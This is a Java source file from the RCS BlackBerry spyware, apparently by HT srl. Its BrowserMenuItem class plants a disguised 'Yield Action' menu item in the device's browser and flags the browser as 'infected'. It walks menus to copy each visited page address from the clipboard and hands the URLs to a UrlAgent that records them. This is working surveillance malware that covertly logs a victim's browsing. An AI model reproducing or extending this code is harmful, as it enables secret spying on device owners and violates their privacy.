//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.agent.url;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.Device;
import blackberry.agent.UrlAgent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.MenuWalker;
import blackberry.utils.Utils;

public class BrowserMenuItem extends ApplicationMenuItem {
    private static final String BROWSER_MENU = "Yield Action";
    //#ifdef DEBUG
    private static Debug debug = new Debug("BrowserMenuItem",
            DebugLevel.VERBOSE);
    //#endif
    static BrowserMenuItem instance;

    Screen browserScreen;
    UiApplication browserApp;
    String lastUrl;

    Thread menuThread;
    UrlAgent agent;
    private long bbmid;

    public static BrowserMenuItem getInstance() {
        if (instance == null)
            instance = new BrowserMenuItem(20);

        return instance;
    }

    public BrowserMenuItem(int arg0) {
        super(arg0);

        if (Device.getInstance().atLeast(6, 0)) {
            bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
        } else {
            bbmid = ApplicationMenuItemRepository.MENUITEM_BROWSER;

        }
    }

    /**
     * Viene chiamato quando viene premuto il menu Si esegue nel contesto
     * dell'applicazione
     */

    public Object run(Object context) {
        try {
            //#ifdef DEBUG
            debug.init();
            debug.trace("run in context");
            //#endif

            if (Device.getInstance().atLeast(6, 0)) {
                boolean ret = MenuWalker.walk("Copy Page Address");
                if (ret) {
                    String url = (String) Clipboard.getClipboard().get();
                    if (url != null) {
                        //#ifdef DEBUG
                        debug.trace("run, 6.0, URL FOUND:" + url);
                        //#endif
                        context = url;
                    }
                } else {
                    //#ifdef DEBUG
                    debug.error("run: no Copy Address, wrong screen");
                    //#endif
                    return null;
                }
            }

            if (browserScreen == null) {
                //#ifdef DEBUG
                debug.info("run: init Browser Screen");
                //#endif
                browserApp = UiApplication.getUiApplication();
                browserScreen = browserApp.getActiveScreen();

                //#ifdef DEBUG
                debug.trace("run browserScreen: " + browserScreen);
                //#endif

                //#ifdef DEBUG
                debug.info("BROWSER INJECTED!");
                //#endif

                //#ifdef DEMO
                Debug.ledFlash(Debug.COLOR_GREEN);
                //#endif

                AppInjectorBrowser.getInstance().setInfected(true);
            }

            if (context == null) {
                //#ifdef DEBUG
                debug.trace("NO URL: " + context);
                //#endif
                return null;
            }

            String url = (String) context;
            urlManagement(url);

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.warn("injectBrowser:" + ex.toString());
            //#endif
        }
        return null;
    }

    public String toString() {
        return BROWSER_MENU;
    }

    boolean menuAdded = false;

    public synchronized void addMenuBrowser() {
        if (!menuAdded) {
            //#ifdef DEBUG
            debug.trace("Adding menu browser");
            //#endif

            ApplicationMenuItemRepository.getInstance()
                    .addMenuItem(bbmid, this);
            menuAdded = true;
        }
    }

    public synchronized void removeMenuBrowser() {
        if (menuAdded) {
            //#ifdef DEBUG
            debug.trace("Removing menu browser");
            //#endif

            ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid,
                    this);
            menuAdded = false;
        }
    }

    public void urlManagement(String url) {
        if (!url.equals(lastUrl)) {
            lastUrl = url;
            //#ifdef DEBUG
            debug.info("NEW URL: " + url);
            //#endif

            if (agent == null) {
                agent = UrlAgent.getInstance();
            }

            agent.saveUrl(url);
        } else {
            //#ifdef DEBUG
            debug.trace("callMenuInContext: same url");
            //#endif
        }
    }

    public void callMenuInContext() {
        //#ifdef DEBUG
        debug.trace("callMenuInContext");
        //#endif
        if (browserScreen != null) {
            addMenuBrowser();
            Utils.sleep(200);
            browserScreen = browserApp.getActiveScreen();

            if (firsttime) {
                //#ifdef DEBUG
                debug.trace("callMenuInContext: close the about");
                //#endif
                firsttime = false;
                MenuWalker.walk("Close", browserScreen, false);
            } else {
                MenuWalker.walk(BROWSER_MENU, browserScreen, false);
            }
            Utils.sleep(200);
            removeMenuBrowser();
        } else {
            //#ifdef DEBUG
            debug.trace("callMenuInContext: null browserScreen");
            //#endif
        }
    }

    boolean firsttime = false;

    public void firstTime() {
        firsttime = true;

    }
}
